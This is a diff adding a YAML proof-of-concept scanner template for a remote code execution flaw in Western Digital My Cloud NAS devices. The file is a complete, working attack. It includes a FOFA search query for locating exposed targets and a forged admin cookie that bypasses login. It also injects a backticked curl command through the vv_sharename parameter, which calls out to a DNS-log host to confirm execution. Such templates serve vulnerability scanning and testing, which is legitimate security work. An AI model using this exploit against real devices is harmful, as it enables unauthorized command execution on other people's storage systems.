@@ -1,0 +1,20 @@
+id: poc-yaml-western-digital-my-cloud-nas-chk-vv-sharename-php-rce
+info:
+  name: Western Digital My Cloud NAS chk_vv_sharename.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: my_cloud_nas
+  fofa: icon_hash="-1074357885" && header="PHP/5.4.16"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /web/php/chk_vv_sharename.php?vv_sharename=`curl+{{.domain}}`
+  headers:
+    Cookie: username=admin; isAdmin=1
+  expression: status_code == 200 && contains(body,"<config><res>0</res></config>")
+    && reverse.Verify()
+transport: http
